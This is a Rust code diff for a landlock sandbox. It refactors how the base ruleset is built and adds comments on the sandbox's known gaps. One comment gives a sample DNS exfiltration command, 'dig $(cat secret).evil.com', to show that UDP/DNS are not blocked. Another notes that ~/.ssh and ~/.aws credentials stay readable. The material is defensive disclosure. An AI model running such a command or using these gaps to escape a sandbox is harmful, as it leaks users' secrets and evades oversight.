@@ -151,7 +151,7 @@ fn apply_landlock(
 ///   （注：landlock 并集语义下 workdir 可写会使 .git 继承可写，VCS 实际写保护
 ///   由应用层 builtin 黑名单补充（S5 已落地），见模块文档）。
 fn build_ruleset(policy: &SandboxPolicy) -> Result<landlock::RulesetCreated, SandboxError> {
-    use landlock::{Access, Ruleset, path_beneath_rules};
+    use landlock::{Access, path_beneath_rules};
 
     let handled = landlock::AccessFs::from_all(TARGET_ABI);
     let ro_access = landlock::AccessFs::from_read(TARGET_ABI);
@@ -163,26 +163,24 @@ fn build_ruleset(policy: &SandboxPolicy) -> Result<landlock::RulesetCreated, San
     // 不为网络添加任何 allow 规则 = 全部拒绝。web.fetch 在主进程内执行不受
     // 影响（沙箱只作用于 spawn 的子进程）；需要子进程联网用 external-sandbox/
     // danger-full-access。
+    //
+    // **诚实边界（2026-08-25 审查 §6.1-S3）**：landlock ABI4 网络原语仅覆盖
+    // TCP——UDP/DNS/ICMP/raw socket **不受限**，"deny all TCP"≠断网。沙箱子
+    // 进程仍可用 DNS 查询（`dig $(cat secret).evil.com`）或任意 UDP 报文对外
+    // 通信。彻底封堵需 seccomp（待接入，见 tech-stack.md §13）；在 seccomp
+    // 落地前，doctor 与文档必须如实描述该残留通道。
     let restrict_net = matches!(
         policy,
         SandboxPolicy::ReadOnly | SandboxPolicy::WorkspaceWrite { .. }
     );
-    let base = if restrict_net {
-        Ruleset::default()
-            .handle_access(handled)
-            .map_err(|e| SandboxError::Sandbox(e.to_string()))?
-            .handle_access(landlock::AccessNet::BindTcp | landlock::AccessNet::ConnectTcp)
-            .map_err(|e| SandboxError::Sandbox(format!("net access: {e}")))?
-    } else {
-        Ruleset::default()
-            .handle_access(handled)
-            .map_err(|e| SandboxError::Sandbox(e.to_string()))?
-    };
-    let mut ruleset = base
+    let mut ruleset = make_base_ruleset(handled, restrict_net)?
         .create()
         .map_err(|e| SandboxError::Sandbox(e.to_string()))?;
     if restrict_net {
-        tracing::info!("landlock network restriction enabled (deny all TCP for child processes)");
+        tracing::info!(
+            "landlock network restriction enabled (deny all TCP for child processes; \
+             UDP/DNS remain unrestricted until seccomp lands)"
+        );
     }
 
     // 系统只读路径放行（必须，否则子进程无法 exec / 读库）
@@ -198,6 +196,11 @@ fn build_ruleset(policy: &SandboxPolicy) -> Result<landlock::RulesetCreated, San
     // /tmp 不可写，cargo build/编译器/测试框架大概率直接失败，把用户推向
     // external-sandbox/danger-full-access 的安全侵蚀压力。HOME 只读满足
     // registry 缓存/配置读取；TMPDIR 读写满足编译临时目录。
+    //
+    // **诚实边界（2026-08-25 审查 §6.2-S4）**：HOME 整体只读放行意味着沙箱
+    // 内命令可读取 `~/.ssh`、`~/.aws` 等全部用户凭证并复制进可写的 workdir。
+    // 这是可用性/安全的显式取舍——细粒度 HOME 白名单（仅 .cargo/registry 等）
+    // 列为后续增强（需 roadmap 立项）。
     if let Ok(home) = std::env::var("HOME")
         && !home.is_empty()
     {
@@ -278,6 +281,29 @@ fn build_ruleset(policy: &SandboxPolicy) -> Result<landlock::RulesetCreated, San
     }
 
     Ok(ruleset)
+}
+
+/// 构造基础 Ruleset：fs handle 全量 + 可选 TCP 网络拒绝（`restrict_net`）。
+///
+/// 网络拒绝语义见 [`build_ruleset`] 内注释——landlock 仅支持 TCP 原语，
+/// UDP/DNS 残留通道由 seccomp（待接入）封堵。
+fn make_base_ruleset(
+    handled: landlock::BitFlags<landlock::AccessFs>,
+    restrict_net: bool,
+) -> Result<landlock::Ruleset, SandboxError> {
+    use landlock::{AccessNet, Ruleset};
+    let base = if restrict_net {
+        Ruleset::default()
+            .handle_access(handled)
+            .map_err(|e| SandboxError::Sandbox(e.to_string()))?
+            .handle_access(AccessNet::BindTcp | AccessNet::ConnectTcp)
+            .map_err(|e| SandboxError::Sandbox(format!("net access: {e}")))?
+    } else {
+        Ruleset::default()
+            .handle_access(handled)
+            .map_err(|e| SandboxError::Sandbox(e.to_string()))?
+    };
+    Ok(base)
 }
 
 #[cfg(test)]
